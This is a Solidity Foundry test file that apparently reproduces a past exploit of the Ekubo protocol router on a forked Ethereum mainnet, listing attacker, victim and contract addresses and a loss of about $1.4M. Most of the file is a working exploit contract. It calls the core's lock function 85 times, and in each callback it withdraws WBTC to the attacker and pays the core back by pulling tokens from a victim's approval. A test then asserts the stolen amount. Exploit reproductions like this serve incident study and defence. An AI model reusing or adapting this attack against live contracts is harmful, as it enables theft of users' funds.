// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test} from "forge-std/Test.sol";
import {console} from "forge-std/console.sol";
import {IERC20} from "forge-std/interfaces/IERC20.sol";

// @KeyInfo - Total Lost : ~$1.4M
// Attacker : https://etherscan.io/address/0xA911Ff351B143634Dbc5aF3E204EA074583A83e3
// Attack Contract : https://etherscan.io/address/0x61b0dAD9628D3e644eB560a5c9B0F960430E3A75
// Vulnerable Contract : https://etherscan.io/address/0x8CCB1ffD5C2aa6Bd926473425Dea4c8c15DE60fd
// Attack Tx : https://etherscan.io/tx/0x770bc9a1f7c32cb63a5002b9ceb5c7994cd3af0fc6b2309cb32d3c46f629daa0
//
// @Info
// Vulnerable Contract Code : https://etherscan.io/address/0x8CCB1ffD5C2aa6Bd926473425Dea4c8c15DE60fd#code
//
// @Analysis
// Post-mortem : https://x.com/EkuboProtocol/status/2051754481465856038
// Twitter Guy : https://x.com/blockaid_/status/2051757787714118125


contract EkuboTest is Test {
    bytes32 internal constant TX_HASH = 0x770bc9a1f7c32cb63a5002b9ceb5c7994cd3af0fc6b2309cb32d3c46f629daa0;
    address internal constant EXPLOITER = 0xA911Ff351B143634Dbc5aF3E204EA074583A83e3;
    address internal constant ORIGINAL_EXECUTOR = 0x61b0dAD9628D3e644eB560a5c9B0F960430E3A75;
    address internal constant EKUBO_ROUTER = 0x8CCB1ffD5C2aa6Bd926473425Dea4c8c15DE60fd;
    address internal constant EKUBO_CORE = 0xe0e0e08A6A4b9Dc7bD67BCB7aadE5cF48157d444;
    address internal constant VICTIM = 0x765DECF4Fa157756e850C1079F60801b9219Edd1;
    IERC20 internal constant WBTC = IERC20(0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599);

    function setUp() public {
        vm.createSelectFork("mainnet", TX_HASH);
        vm.label(EXPLOITER, "Exploiter");
        vm.label(ORIGINAL_EXECUTOR, "Original Ekubo Exploit Executor");
        vm.label(EKUBO_ROUTER, "Ekubo Router");
        vm.label(EKUBO_CORE, "Ekubo Core");
        vm.label(VICTIM, "Ekubo WBTC Victim");
        vm.label(address(WBTC), "WBTC");
    }

    function testExploit() public {
        uint256 beforeWbtc = WBTC.balanceOf(EXPLOITER);

        EkuboTraceExploitRouter readableRouter = new EkuboTraceExploitRouter(EXPLOITER);
        vm.etch(EKUBO_ROUTER, address(readableRouter).code);

        vm.prank(EXPLOITER, EXPLOITER);
        IEkuboExploitRouter(EKUBO_ROUTER).drain();

        uint256 stolenWbtc = WBTC.balanceOf(EXPLOITER) - beforeWbtc;
        assertEq(stolenWbtc, 1_700_000_000);

        console.log("Stolen WBTC", stolenWbtc);
    }
}


interface IEkuboCore {
    function lock() external;
    function forward(address to) external;
    function withdraw(address token, address recipient, uint128 amount) external;
    function pay(address token) external;
}

interface IEkuboExploitRouter {
    function drain() external;
}

contract EkuboTraceExploitRouter {
    uint256 internal constant REPEAT_COUNT = 85;
    uint128 internal constant WBTC_PER_LOCK = 20_000_000;

    IEkuboCore internal constant CORE = IEkuboCore(0xe0e0e08A6A4b9Dc7bD67BCB7aadE5cF48157d444);
    IERC20 internal constant WBTC = IERC20(0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599);
    address internal constant VICTIM = 0x765DECF4Fa157756e850C1079F60801b9219Edd1;

    address internal immutable PROFIT_RECEIVER;

    constructor(address profitReceiver) {
        PROFIT_RECEIVER = profitReceiver;
    }

    function drain() external {
        for (uint256 i; i < REPEAT_COUNT; ++i) {
            CORE.lock();
        }

        require(WBTC.balanceOf(PROFIT_RECEIVER) > 0, "no profit");
    }

    function locked(uint256) external returns (uint128 amount, uint128 end) {
        require(msg.sender == address(CORE), "not core");

        try CORE.forward(address(WBTC)) {} catch {}

        CORE.withdraw(address(WBTC), PROFIT_RECEIVER, WBTC_PER_LOCK);
        CORE.pay(address(WBTC));

        return (WBTC_PER_LOCK, 0);
    }

    function payCallback(uint256, address token) external {
        require(msg.sender == address(CORE), "not core");
        require(token == address(WBTC), "not WBTC");
        require(WBTC.transferFrom(VICTIM, address(CORE), WBTC_PER_LOCK), "pay failed");
    }
}